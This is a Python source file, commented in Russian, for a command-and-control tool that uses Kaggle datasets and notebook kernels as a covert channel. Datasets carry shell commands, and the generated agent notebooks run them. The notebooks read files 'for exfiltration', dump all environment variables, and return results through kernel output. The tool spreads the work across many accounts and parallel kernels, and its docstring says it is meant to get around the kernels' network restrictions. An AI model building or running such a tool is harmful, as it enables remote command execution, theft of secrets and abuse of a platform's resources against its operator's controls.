#!/usr/bin/env python3
"""
Kaggle C2 Transport - использует Kaggle API как транспортный слой для C2.
Обходит сетевые ограничения kernel через dataset/kernel output.

Архитектура:
1. Dataset = Command Queue (входящий канал)
2. Kernel = Agent (выполнитель)  
3. Output = Exfil Channel (исходящий канал)
"""

import os
import sys
import json
import time
import uuid
import subprocess
import tempfile
import threading
from pathlib import Path
from typing import Dict, List, Optional, Callable, Tuple, Any
from datetime import datetime

# Kaggle CLI integration
KAGGLE_CLI = "kaggle"

class KaggleC2Transport:
    """
    Управляет коммуникацией между C2 сервером и Kaggle kernels.
    
    Workflow:
    1. Создать dataset с командами
    2. Создать kernel который читает dataset
    3. Kernel выполняет команды, пишет results в output
    4. Читать output через API
    """
    
    # Class-level cache for kernel status
    _status_cache = {}
    _last_status_check = {}
    
    def __init__(self, username: str, api_key: str, dataset_slug: str = None, log_fn: Callable = None):
        self.username = username
        self.api_key = api_key
        self.log = log_fn or print
        
        # Setup kaggle credentials
        self._setup_credentials()
        
        # Names - use existing dataset if provided
        self.dataset_slug = dataset_slug or f"{username}/gpu-resources"
        self.dataset_name = self.dataset_slug.split("/")[-1] if dataset_slug else f"c2-commands-{username}"
        self.kernel_name = f"c2-agent-{username}"
        self.kernel_slug = f"{username}/{self.kernel_name}"
        
        # State
        self.command_version = int(time.time())
        self.pending_commands = []
        self.results = []
        self.last_check = 0
        self._kernel_ready = False  # Cache for kernel existence
        
    def _setup_credentials(self):
        """Setup kaggle.json for CLI authentication."""
        kaggle_dir = Path.home() / ".kaggle"
        kaggle_dir.mkdir(parents=True, exist_ok=True)
        kaggle_json = kaggle_dir / "kaggle.json"
        
        kaggle_json.write_text(json.dumps({
            "username": self.username,
            "key": self.api_key
        }))
        os.chmod(kaggle_json, 0o600)
        
    def _run_kaggle(self, args: List[str], timeout: int = 60, cwd: str = None) -> tuple:
        """Run kaggle CLI command."""
        env = os.environ.copy()
        env["KAGGLE_USERNAME"] = self.username
        env["KAGGLE_KEY"] = self.api_key
        
        cmd = [KAGGLE_CLI] + args
        self.log(f"[KAGGLE] {' '.join(cmd[:3])}...")
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=cwd,
                env=env
            )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return -1, "", "Timeout"
        except Exception as e:
            return -1, "", str(e)
    
    # ==================== DATASET MANAGEMENT ====================
    
    def create_dataset(self) -> bool:
        """Create initial dataset for commands."""
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            
            # Dataset metadata
            metadata = {
                "title": self.dataset_name,
                "id": self.dataset_slug,
                "licenses": [{"name": "CC0-1.0"}],
                "description": "C2 command queue"
            }
            (tmpdir_path / "dataset-metadata.json").write_text(json.dumps(metadata, indent=2))
            
            # Initial commands file
            commands = {
                "version": self.command_version,
                "agent_id": str(uuid.uuid4()),
                "commands": [],
                "created": datetime.now().isoformat()
            }
            (tmpdir_path / "commands.json").write_text(json.dumps(commands, indent=2))
            
            # Create dataset
            ret, out, err = self._run_kaggle(["datasets", "create", "-p", tmpdir, "--public"], timeout=120)
            
            if ret == 0 or "already exists" in err.lower():
                self.log(f"[DATASET] Created: {self.dataset_slug}")
                return True
            else:
                self.log(f"[DATASET] Error: {err[:200]}")
                return False
    
    def update_commands(self, commands: List[Dict]) -> bool:
        """Update dataset with new commands."""
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            
            # Dataset metadata (for versioning)
            metadata = {
                "title": self.dataset_name,
                "id": self.dataset_slug,
                "licenses": [{"name": "CC0-1.0"}]
            }
            (tmpdir_path / "dataset-metadata.json").write_text(json.dumps(metadata, indent=2))
            
            # Commands file
            self.command_version = int(time.time())
            data = {
                "version": self.command_version,
                "agent_id": getattr(self, 'agent_id', str(uuid.uuid4())),
                "commands": commands,
                "created": datetime.now().isoformat()
            }
            (tmpdir_path / "commands.json").write_text(json.dumps(data, indent=2))
            
            # Create new version
            ret, out, err = self._run_kaggle(["datasets", "version", "-p", tmpdir, "-m", f"v{self.command_version}"], timeout=120)
            
            if ret == 0:
                self.log(f"[DATASET] Updated: v{self.command_version} with {len(commands)} commands")
                return True
            else:
                # Try create if doesn't exist
                if "not found" in err.lower():
                    return self.create_dataset()
                self.log(f"[DATASET] Update error: {err[:200]}")
                return False
    
    # ==================== KERNEL MANAGEMENT ====================
    
    def create_kernel(self) -> bool:
        """Create kernel that reads dataset and executes commands."""
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            
            # Kernel metadata
            metadata = {
                "id": self.kernel_slug,
                "title": self.kernel_name,
                "code_file": "notebook.ipynb",
                "language": "python",
                "kernel_type": "notebook",
                "is_private": "true",
                "enable_gpu": "false",
                "enable_internet": "false",
                "dataset_sources": [self.dataset_slug],
                "competition_sources": [],
                "kernel_sources": [],
                "model_sources": []
            }
            (tmpdir_path / "kernel-metadata.json").write_text(json.dumps(metadata, indent=2))
            
            # Agent notebook
            notebook = self._generate_agent_notebook()
            (tmpdir_path / "notebook.ipynb").write_text(json.dumps(notebook, indent=2))
            
            # Push kernel
            ret, out, err = self._run_kaggle(["kernels", "push", "-p", tmpdir], timeout=120)
            
            if ret == 0:
                self.log(f"[KERNEL] Created: {self.kernel_slug}")
                return True
            else:
                self.log(f"[KERNEL] Error: {err[:200]}")
                return False
    
    def _generate_agent_notebook(self) -> Dict:
        """Generate agent notebook code."""
        return {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": None,
                    "metadata": {},
                    "outputs": [],
                    "source": [
                        'import json\n',
                        'import os\n',
                        'import subprocess\n',
                        'import time\n',
                        'import socket\n',
                        'import platform\n',
                        'from pathlib import Path\n',
                        '\n',
                        'print("="*60, flush=True)\n',
                        'print("KAGGLE C2 AGENT v1.0", flush=True)\n',
                        'print("="*60, flush=True)\n',
                        '\n',
                        '# Agent info\n',
                        'AGENT_ID = os.environ.get("KAGGLE_KERNEL_RUN_TYPE", "batch") + "-" + socket.gethostname()[:10]\n',
                        'print(f"[AGENT] {AGENT_ID}", flush=True)\n',
                        'print(f"[HOST] {socket.gethostname()}", flush=True)\n',
                        'print(f"[OS] {platform.system()} {platform.release()}", flush=True)\n',
                        '\n',
                        '# Find commands file recursively\n',
                        'commands_file = None\n',
                        'for p in Path("/kaggle/input").rglob("commands.json"):\n',
                        '    commands_file = p\n',
                        '    print(f"[FOUND] {p}", flush=True)\n',
                        '    break\n',
                        '\n',
                        'if not commands_file:\n',
                        '    print("[ERR] No commands.json found!", flush=True)\n',
                        '    raise SystemExit(1)\n',
                        '\n',
                        '# Read commands\n',
                        'try:\n',
                        '    data = json.loads(commands_file.read_text())\n',
                        '    version = data.get("version", 0)\n',
                        '    commands = data.get("commands", [])\n',
                        '    print(f"[VERSION] {version}", flush=True)\n',
                        '    print(f"[COMMANDS] {len(commands)}", flush=True)\n',
                        'except Exception as e:\n',
                        '    print(f"[ERR] Failed to read commands: {e}", flush=True)\n',
                        '    commands = []\n',
                        '\n',
                        '# Execute commands\n',
                        'results = []\n',
                        'for cmd in commands:\n',
                        '    cmd_id = cmd.get("id", "unknown")\n',
                        '    cmd_type = cmd.get("type", "shell")\n',
                        '    payload = cmd.get("payload", "")\n',
                        '    \n',
                        '    print(f"\\n[EXEC] {cmd_id}: {cmd_type} - {payload[:50]}...", flush=True)\n',
                        '    \n',
                        '    result = {"id": cmd_id, "type": cmd_type, "status": "error", "output": ""}\n',
                        '    \n',
                        '    try:\n',
                        '        if cmd_type == "shell":\n',
                        '            out = subprocess.check_output(\n',
                        '                payload, shell=True, \n',
                        '                stderr=subprocess.STDOUT, \n',
                        '                timeout=60\n',
                        '            ).decode(errors="replace")\n',
                        '            result["status"] = "ok"\n',
                        '            result["output"] = out[:10000]\n',
                        '            \n',
                        '        elif cmd_type == "download":\n',
                        '            # Read file for exfiltration\n',
                        '            target = payload\n',
                        '            if Path(target).exists():\n',
                        '                result["output"] = Path(target).read_text(errors="replace")[:50000]\n',
                        '                result["status"] = "ok"\n',
                        '            else:\n',
                        '                result["output"] = f"File not found: {target}"\n',
                        '                \n',
                        '        elif cmd_type == "upload":\n',
                        '            # Write file\n',
                        '            dest = cmd.get("path", "/kaggle/working/upload.txt")\n',
                        '            Path(dest).write_text(payload)\n',
                        '            result["status"] = "ok"\n',
                        '            result["output"] = f"Written to {dest}"\n',
                        '            \n',
                        '        elif cmd_type == "info":\n',
                        '            # System info\n',
                        '            info = {\n',
                        '                "hostname": socket.gethostname(),\n',
                        '                "os": platform.system(),\n',
                        '                "release": platform.release(),\n',
                        '                "machine": platform.machine(),\n',
                        '                "python": platform.python_version(),\n',
                        '                "cwd": os.getcwd(),\n',
                        '                "env": dict(os.environ)\n',
                        '            }\n',
                        '            result["status"] = "ok"\n',
                        '            result["output"] = json.dumps(info, indent=2)\n',
                        '            \n',
                        '        elif cmd_type == "sleep":\n',
                        '            duration = int(payload) if payload.isdigit() else 60\n',
                        '            time.sleep(duration)\n',
                        '            result["status"] = "ok"\n',
                        '            result["output"] = f"Slept {duration}s"\n',
                        '            \n',
                        '    except subprocess.TimeoutExpired:\n',
                        '        result["output"] = "Timeout"\n',
                        '    except subprocess.CalledProcessError as e:\n',
                        '        result["output"] = e.output.decode(errors="replace") if e.output else str(e)\n',
                        '    except Exception as e:\n',
                        '        result["output"] = str(e)\n',
                        '    \n',
                        '    print(f"[DONE] {cmd_id}: {result[\'status\']}", flush=True)\n',
                        '    results.append(result)\n',
                        '\n',
                        '# Write results\n',
                        'output_data = {\n',
                        '    "agent_id": AGENT_ID,\n',
                        '    "version": version,\n',
                        '    "timestamp": time.time(),\n',
                        '    "results": results\n',
                        '}\n',
                        '\n',
                        'output_file = Path("/kaggle/working/results.json")\n',
                        'output_file.write_text(json.dumps(output_data, indent=2))\n',
                        'print(f"\\n[OUTPUT] {output_file}", flush=True)\n',
                        'print(f"[RESULTS] {len(results)} commands processed", flush=True)\n',
                        'print("="*60, flush=True)\n',
                        'print("AGENT COMPLETE", flush=True)\n',
                        'print("="*60, flush=True)\n'
                    ]
                }
            ],
            "metadata": {
                "kernelspec": {
                    "display_name": "Python 3",
                    "language": "python",
                    "name": "python3"
                },
                "language_info": {
                    "name": "python",
                    "version": "3.10.0"
                }
            },
            "nbformat": 4,
            "nbformat_minor": 4
        }
    
    def run_kernel(self) -> bool:
        """Trigger kernel execution by pushing new version."""
        # Push triggers automatic run
        return self.create_kernel()
    
    def get_kernel_status(self) -> str:
        """Check kernel status with caching."""
        now = time.time()
        
        # Use cache if less than 10 seconds old
        if self.kernel_slug in self._last_status_check:
            if now - self._last_status_check[self.kernel_slug] < 10:
                return self._status_cache.get(self.kernel_slug, "unknown")
        
        ret, out, err = self._run_kaggle(["kernels", "status", self.kernel_slug], timeout=30)
        
        status = "error"
        if ret == 0:
            if "COMPLETE" in out:
                status = "complete"
            elif "RUNNING" in out:
                status = "running"
            elif "QUEUED" in out:
                status = "queued"
            else:
                status = "unknown"
        
        self._status_cache[self.kernel_slug] = status
        self._last_status_check[self.kernel_slug] = now
        return status
    
    def get_results(self, timeout: int = 300) -> Optional[Dict]:
        """Get kernel output results."""
        with tempfile.TemporaryDirectory() as tmpdir:
            ret, out, err = self._run_kaggle(
                ["kernels", "output", self.kernel_slug, "-p", tmpdir],
                timeout=timeout
            )
            
            if ret != 0:
                self.log(f"[OUTPUT] Error: {err[:200]}")
                return None
            
            # Find results.json
            tmpdir_path = Path(tmpdir)
            results_file = tmpdir_path / "results.json"
            
            if results_file.exists():
                data = json.loads(results_file.read_text())
                self.log(f"[OUTPUT] Got {len(data.get('results', []))} results")
                return data
            else:
                # Check for log file
                for f in tmpdir_path.glob("*.log"):
                    self.log(f"[OUTPUT] Log: {f.name}")
                    # Try to parse from log
                    try:
                        log_data = json.loads(f.read_text())
                        # Extract stdout
                        for line in log_data:
                            if line.get("stream_name") == "stdout":
                                self.log(f"[LOG] {line.get('data', '')[:100]}")
                    except:
                        pass
                
                self.log("[OUTPUT] No results.json found")
                return None
    
    # ==================== HIGH-LEVEL API ====================
    
    def setup(self) -> bool:
        """Initialize dataset and kernel."""
        self.log(f"[SETUP] Initializing {self.username}...")
        
        # Create dataset
        if not self.create_dataset():
            return False
        
        # Create kernel
        if not self.create_kernel():
            return False
        
        self.log("[SETUP] Complete!")
        return True
    
    def send_command(self, cmd_type: str, payload: str, cmd_id: str = None) -> str:
        """Queue a command for execution."""
        cmd_id = cmd_id or f"cmd-{int(time.time())}-{uuid.uuid4().hex[:8]}"
        
        cmd = {
            "id": cmd_id,
            "type": cmd_type,
            "payload": payload
        }
        
        self.pending_commands.append(cmd)
        self.log(f"[QUEUE] {cmd_id}: {cmd_type}")
        return cmd_id
    
    def flush_commands(self) -> bool:
        """Send all pending commands and run kernel."""
        if not self.pending_commands:
            self.log("[FLUSH] No pending commands")
            return True
        
        # Update dataset
        if not self.update_commands(self.pending_commands):
            return False
        
        # Run kernel
        if not self.run_kernel():
            return False
        
        # Clear pending
        self.pending_commands = []
        return True
    
    def execute_and_wait(self, commands: List[Dict], timeout: int = 300) -> Optional[Dict]:
        """Execute commands and wait for results."""
        # Update dataset
        if not self.update_commands(commands):
            return None
        
        # Run kernel
        if not self.run_kernel():
            return None
        
        # Wait for completion
        start = time.time()
        while time.time() - start < timeout:
            status = self.get_kernel_status()
            
            if status == "complete":
                time.sleep(5)  # Wait for output to be ready
                return self.get_results()
            elif status == "error":
                return None
            
            time.sleep(10)
        
        self.log("[EXEC] Timeout waiting for kernel")
        return None
    
    def quick_command(self, cmd_type: str, payload: str, timeout: int = 300) -> Optional[Dict]:
        """Send single command and get result."""
        cmd_id = f"quick-{int(time.time())}"
        result = self.execute_and_wait([{
            "id": cmd_id,
            "type": cmd_type,
            "payload": payload
        }], timeout=timeout)
        
        if result and result.get("results"):
            return result["results"][0]
        return None


class KaggleC2Manager:
    """
    Управляет несколькими Kaggle аккаунтами как агентами C2.
    Интегрируется с существующим C2 сервером.
    """
    
    def __init__(self, accounts_file: str = None, log_fn: Callable = None):
        self.log = log_fn or print
        self.transports: Dict[str, KaggleC2Transport] = {}
        self.accounts_file = accounts_file or str(Path(__file__).parent / "data" / "accounts.json")
        
    def load_accounts(self) -> int:
        """Load accounts from file."""
        try:
            accounts = json.loads(Path(self.accounts_file).read_text())
            for acc in accounts:
                # Use kaggle_username (real Kaggle username) if available
                kaggle_username = acc.get("kaggle_username") or acc.get("username")
                api_key = acc.get("api_key")
                dataset_slug = acc.get("dataset_slug")
                if kaggle_username and api_key:
                    transport = KaggleC2Transport(
                        kaggle_username, api_key, dataset_slug, self.log
                    )
                    transport.kaggle_username = kaggle_username
                    self.transports[kaggle_username] = transport
            self.log(f"[MANAGER] Loaded {len(self.transports)} accounts")
            return len(self.transports)
        except Exception as e:
            self.log(f"[MANAGER] Error loading accounts: {e}")
            return 0
    
    def setup_all(self) -> Dict[str, bool]:
        """Setup all accounts."""
        results = {}
        for username, transport in self.transports.items():
            results[username] = transport.setup()
        return results
    
    def get_agent(self, username: str) -> Optional[KaggleC2Transport]:
        """Get transport for specific agent."""
        return self.transports.get(username)
    
    def list_agents(self) -> List[str]:
        """List all available agents."""
        return list(self.transports.keys())


class KaggleMultiKernel:
    """
    Управляет несколькими kernels для одного Kaggle аккаунта.
    Позволяет параллельно выполнять команды на разных kernels.
    """
    
    def __init__(self, username: str, api_key: str, dataset_slug: str, kernel_count: int = 5, log_fn: Callable = None):
        self.username = username
        self.api_key = api_key
        self.dataset_slug = dataset_slug
        self.kernel_count = kernel_count
        self.log = log_fn or print
        
        # Setup credentials
        self._setup_credentials()
        
        # Kernel names (c2-agent-1, c2-agent-2, ..., c2-agent-N)
        self.kernel_slugs = [f"{username}/c2-agent-{i+1}" for i in range(kernel_count)]
        self.current_kernel = 0
        
    def _setup_credentials(self):
        """Setup kaggle.json for CLI authentication."""
        kaggle_dir = Path.home() / ".kaggle"
        kaggle_dir.mkdir(parents=True, exist_ok=True)
        kaggle_json = kaggle_dir / "kaggle.json"
        kaggle_json.write_text(json.dumps({"username": self.username, "key": self.api_key}))
        kaggle_json.chmod(0o600)
    
    def _run_kaggle(self, args: List[str], timeout: int = 120) -> Tuple[int, str, str]:
        """Run kaggle CLI command."""
        try:
            result = subprocess.run(
                ["kaggle"] + args,
                capture_output=True, text=True, timeout=timeout
            )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return 1, "", "Timeout"
        except Exception as e:
            return 1, "", str(e)
    
    def get_next_kernel(self) -> str:
        """Get next kernel in round-robin fashion."""
        kernel = self.kernel_slugs[self.current_kernel]
        self.current_kernel = (self.current_kernel + 1) % self.kernel_count
        return kernel
    
    def update_dataset(self, commands: List[Dict]) -> bool:
        """Update dataset with commands."""
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            
            metadata = {
                "title": self.dataset_slug.split("/")[-1],
                "id": self.dataset_slug,
                "licenses": [{"name": "CC0-1.0"}]
            }
            (tmpdir_path / "dataset-metadata.json").write_text(json.dumps(metadata, indent=2))
            
            data = {
                "version": int(time.time()),
                "commands": commands,
                "created": datetime.now().isoformat()
            }
            (tmpdir_path / "commands.json").write_text(json.dumps(data, indent=2))
            
            ret, out, err = self._run_kaggle(["datasets", "version", "-p", tmpdir, "-m", f"v{int(time.time())}"], timeout=120)
            
            if ret == 0:
                self.log(f"[DATASET] Updated with {len(commands)} commands")
                return True
            self.log(f"[DATASET] Error: {err[:200]}")
            return False
    
    def run_kernel(self, kernel_slug: str = None) -> bool:
        """Trigger specific kernel execution."""
        kernel = kernel_slug or self.get_next_kernel()
        
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            
            # Minimal kernel update to trigger run
            metadata = {
                "id": kernel,
                "title": kernel.split("/")[-1],
                "code_file": "notebook.ipynb",
                "language": "python",
                "kernel_type": "notebook",
                "is_private": "true",
                "enable_gpu": "false",
                "enable_internet": "false",
                "dataset_sources": [self.dataset_slug]
            }
            (tmpdir_path / "kernel-metadata.json").write_text(json.dumps(metadata, indent=2))
            
            # Minimal notebook
            notebook = {
                "cells": [{"cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [], "source": [
                    "import json, subprocess, socket\n",
                    "from pathlib import Path\n",
                    "AGENT = socket.gethostname()[:10]\n",
                    "print(f'[AGENT-{AGENT}] Ready', flush=True)\n",
                    "cf = next(Path('/kaggle/input').rglob('commands.json'), None)\n",
                    "if not cf: raise SystemExit(1)\n",
                    "cmds = json.loads(cf.read_text()).get('commands', [])\n",
                    "results = []\n",
                    "for c in cmds:\n",
                    "    r = {'id': c.get('id'), 'status': 'error', 'output': ''}\n",
                    "    try:\n",
                    "        if c.get('type') == 'shell':\n",
                    "            out = subprocess.check_output(c.get('payload',''), shell=True, stderr=subprocess.STDOUT, timeout=60)\n",
                    "            r['status'], r['output'] = 'ok', out.decode(errors='replace')[:5000]\n",
                    "    except Exception as e: r['output'] = str(e)\n",
                    "    results.append(r)\n",
                    "Path('/kaggle/working/results.json').write_text(json.dumps({'agent': AGENT, 'results': results}))\n"
                ]}],
                "metadata": {"kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}},
                "nbformat": 4, "nbformat_minor": 4
            }
            (tmpdir_path / "notebook.ipynb").write_text(json.dumps(notebook))
            
            ret, out, err = self._run_kaggle(["kernels", "push", "-p", tmpdir], timeout=120)
            
            if ret == 0:
                self.log(f"[KERNEL] Triggered: {kernel}")
                return True
            self.log(f"[KERNEL] Error: {err[:200]}")
            return False
    
    def get_status(self, kernel_slug: str) -> str:
        """Get kernel status."""
        ret, out, err = self._run_kaggle(["kernels", "status", kernel_slug], timeout=30)
        if ret == 0:
            if "COMPLETE" in out: return "complete"
            if "RUNNING" in out: return "running"
            if "QUEUED" in out: return "queued"
        return "error"
    
    def get_results(self, kernel_slug: str) -> Optional[Dict]:
        """Get kernel results."""
        with tempfile.TemporaryDirectory() as tmpdir:
            ret, out, err = self._run_kaggle(["kernels", "output", kernel_slug, "-p", tmpdir], timeout=60)
            if ret != 0:
                return None
            
            results_file = Path(tmpdir) / "results.json"
            if results_file.exists():
                return json.loads(results_file.read_text())
        return None
    
    def parallel_exec(self, commands: List[Dict], timeout: int = 300) -> Dict[str, Dict]:
        """Execute commands on all kernels in parallel."""
        # Update dataset once
        if not self.update_dataset(commands):
            return {}
        
        # Trigger all kernels
        for kernel in self.kernel_slugs:
            self.run_kernel(kernel)
        
        # Wait for results
        results = {}
        start = time.time()
        
        while time.time() - start < timeout:
            for kernel in self.kernel_slugs:
                if kernel in results:
                    continue
                    
                status = self.get_status(kernel)
                if status == "complete":
                    result = self.get_results(kernel)
                    if result:
                        results[kernel] = result
            
            if len(results) >= self.kernel_count:
                break
            time.sleep(10)
        
        return results
    
    def quick_command(self, cmd_type: str, payload: str, timeout: int = 180) -> Optional[Dict]:
        """Execute single command on next available kernel."""
        kernel = self.get_next_kernel()
        
        # Update dataset
        cmd_id = f"quick-{int(time.time())}"
        if not self.update_dataset([{"id": cmd_id, "type": cmd_type, "payload": payload}]):
            return None
        
        # Run kernel
        if not self.run_kernel(kernel):
            return None
        
        # Wait for result
        start = time.time()
        while time.time() - start < timeout:
            status = self.get_status(kernel)
            if status == "complete":
                result = self.get_results(kernel)
                if result and result.get("results"):
                    return result["results"][0]
            time.sleep(5)
        
        return None
    
    def list_kernels(self) -> List[str]:
        """List all kernels."""
        return self.kernel_slugs
    
    def execute_on_kernel(self, kernel_num: int, command: str, timeout: int = 300) -> Dict:
        """Execute command on specific kernel (1-indexed).
        
        Args:
            kernel_num: Kernel number (1-5)
            command: Shell command to execute
            timeout: Execution timeout
            
        Returns:
            Dict with success, output, error
        """
        if kernel_num < 1 or kernel_num > self.kernel_count:
            return {"success": False, "error": f"Invalid kernel number: {kernel_num}"}
        
        kernel_slug = f"{self.username}/c2-agent-{kernel_num}"
        
        # Create notebook with command
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            
            # Kernel metadata
            metadata = {
                "id": kernel_slug,
                "title": f"C2 Agent {kernel_num}",
                "code_file": "notebook.ipynb",
                "language": "python",
                "kernel_type": "notebook",
                "is_private": True,
                "enable_gpu": True,
                "enable_internet": True
            }
            (tmpdir_path / "kernel-metadata.json").write_text(json.dumps(metadata, indent=2))
            
            # Notebook with command execution
            notebook = {
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": [
                            "import subprocess\n",
                            "import json\n",
                            "import sys\n",
                            "\n",
                            f"cmd = {json.dumps(command)}\n",
                            "print(f'[EXEC] Running: {cmd}', flush=True)\n",
                            "\n",
                            "result = subprocess.run(\n",
                            "    cmd,\n",
                            "    shell=True,\n",
                            "    capture_output=True,\n",
                            "    text=True,\n",
                            f"    timeout={timeout}\n",
                            ")\n",
                            "\n",
                            "output = {\n",
                            "    'success': result.returncode == 0,\n",
                            "    'returncode': result.returncode,\n",
                            "    'stdout': result.stdout,\n",
                            "    'stderr': result.stderr\n",
                            "}\n",
                            "\n",
                            "print(json.dumps(output, indent=2), flush=True)\n",
                            "print('[DONE]', flush=True)\n"
                        ]
                    }
                ],
                "metadata": {
                    "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
                    "language_info": {"name": "python", "version": "3.10.0"}
                },
                "nbformat": 4,
                "nbformat_minor": 4
            }
            (tmpdir_path / "notebook.ipynb").write_text(json.dumps(notebook, indent=2))
            
            # Push kernel
            self.log(f"[KERNEL] Pushing {kernel_slug} with command...")
            ret, out, err = self._run_kaggle(["kernels", "push", "-p", tmpdir], timeout=60)
            
            if ret != 0:
                return {"success": False, "error": err[:200], "kernel": kernel_slug}
            
            self.log(f"[KERNEL] Pushed successfully, waiting for execution...")
            
            # Wait for completion
            start = time.time()
            while time.time() - start < timeout:
                status = self.get_status(kernel_slug)
                if status == "complete":
                    # Get output
                    result = self.get_results(kernel_slug)
                    if result:
                        return {
                            "success": True,
                            "kernel": kernel_slug,
                            "output": result.get("results", [{}])[0].get("output", ""),
                            "result": result
                        }
                time.sleep(5)
            
            return {"success": False, "error": "Timeout waiting for kernel", "kernel": kernel_slug}


# ==================== CLI INTERFACE ====================

def main():
    """CLI interface for testing."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Kaggle C2 Transport")
    parser.add_argument("--setup", action="store_true", help="Setup dataset and kernel")
    parser.add_argument("--cmd", type=str, help="Command to execute")
    parser.add_argument("--type", type=str, default="shell", help="Command type")
    parser.add_argument("--exec", action="store_true", help="Execute and wait")
    parser.add_argument("--status", action="store_true", help="Check kernel status")
    parser.add_argument("--results", action="store_true", help="Get results")
    parser.add_argument("--username", type=str, help="Kaggle username")
    parser.add_argument("--api-key", type=str, help="Kaggle API key")
    
    args = parser.parse_args()
    
    # Get credentials
    username = args.username or os.environ.get("KAGGLE_USERNAME")
    api_key = args.api_key or os.environ.get("KAGGLE_KEY")
    
    if not username or not api_key:
        print("Error: Set KAGGLE_USERNAME and KAGGLE_KEY env vars")
        return 1
    
    transport = KaggleC2Transport(username, api_key)
    
    if args.setup:
        if transport.setup():
            print("Setup complete!")
            return 0
        return 1
    
    if args.status:
        status = transport.get_kernel_status()
        print(f"Status: {status}")
        return 0
    
    if args.results:
        results = transport.get_results()
        if results:
            print(json.dumps(results, indent=2))
        return 0
    
    if args.cmd:
        if getattr(args, 'exec'):
            result = transport.quick_command(args.type, args.cmd)
            if result:
                print(json.dumps(result, indent=2))
            else:
                print("No result")
            return 0
        else:
            cmd_id = transport.send_command(args.type, args.cmd)
            print(f"Queued: {cmd_id}")
            return 0
    
    parser.print_help()
    return 0


if __name__ == "__main__":
    exit(main())
